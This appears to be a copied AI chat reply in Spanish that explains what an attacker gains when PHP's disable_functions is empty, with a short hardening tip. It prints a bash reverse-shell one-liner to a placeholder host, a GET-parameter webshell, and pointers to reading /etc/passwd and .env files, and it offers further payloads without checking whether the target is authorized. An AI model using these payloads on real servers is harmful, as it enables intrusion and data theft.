Cuando en un archivo `phpinfo()` (o en `php.ini`) ves que **`disable_functions` está vacío**, significa que **PHP tiene habilitadas todas las funciones por defecto**, **incluidas las peligrosas desde el punto de vista de seguridad**.

---

### 🎯 ¿Qué se puede conseguir si `disable_functions` está vacío?

Desde el punto de vista de **seguridad ofensiva (pentesting)** o incluso de **configuración segura del servidor**, esto abre **muchas posibilidades**.

Aquí tienes lo que podrías conseguir:

---

### 🧨 1. **Ejecución de comandos del sistema**

Puedes usar funciones como:

- `exec()`
    
- `shell_exec()`
    
- `system()`
    
- `passthru()`
    
- `popen()`
    
- `proc_open()`
    

Con ellas podrías ejecutar comandos directamente en el sistema operativo como si tuvieras acceso a la terminal del servidor.

✅ **Ejemplo**:

php

CopiarEditar

`echo shell_exec('id');`

---

### 🔁 2. **Lectura y escritura de archivos arbitrarios**

Puedes usar funciones como:

- `file_get_contents()`
    
- `fopen()`
    
- `fwrite()`
    
- `unlink()` (para borrar)
    
- `file_put_contents()`
    
- `copy()` y `rename()`
    

Esto te permitiría:

- Leer archivos sensibles como `/etc/passwd`, `.env`, etc.
    
- Escribir o sobrescribir archivos (incluso una webshell).
    

---

### 🛜 3. **Hacer peticiones HTTP desde el servidor**

- `file_get_contents("http://...")` (si allow_url_fopen está habilitado)
    
- `curl_exec()` / `curl_init()` (si CURL está habilitado)
    

Puedes usar esto para:

- Escanear la red interna (SSRF)
    
- Exfiltrar datos
    
- Hacer callback a tu listener (reverse shell)
    

---

### 🔓 4. **Reverse shells en PHP**

Puedes lanzar shells reversas porque puedes usar `exec()` o similares para enviar un payload:

php

CopiarEditar

`exec("/bin/bash -c 'bash -i >& /dev/tcp/tu-ip/puerto 0>&1'");`

O usar una simple webshell tipo:

php

CopiarEditar

`<?php echo shell_exec($_GET['cmd']); ?>`

---

### 🛑 5. **Escalada de privilegios o movimientos laterales** (dependerá del entorno)

Una vez con ejecución de comandos, si el usuario de PHP tiene permisos altos (como `www-data`, `apache`, o peor aún, root), puedes moverte por el sistema, ver otras webs alojadas, o incluso escalar.

---

### 📌 En resumen:

Si `disable_functions` está vacío:

✅ **Puedes ejecutar comandos del sistema.**  
✅ **Puedes leer/escribir archivos.**  
✅ **Puedes montar una webshell o reverse shell fácilmente.**  
✅ **Puedes hacer SSRF o llamadas externas.**  
🔴 **Es un riesgo crítico si hay algún vector de ejecución de PHP (file upload, LFI con `php://input`, eval, etc).**

---

Si estás del lado del **defensor**, lo recomendable sería rellenar `disable_functions` en `php.ini` con algo como:

ini

CopiarEditar

`disable_functions = exec,shell_exec,system,passthru,popen,proc_open`

¿Estás revisando esto desde un entorno real o es parte de un CTF/laboratorio? Puedo ayudarte más con payloads o escenarios concretos si quieres.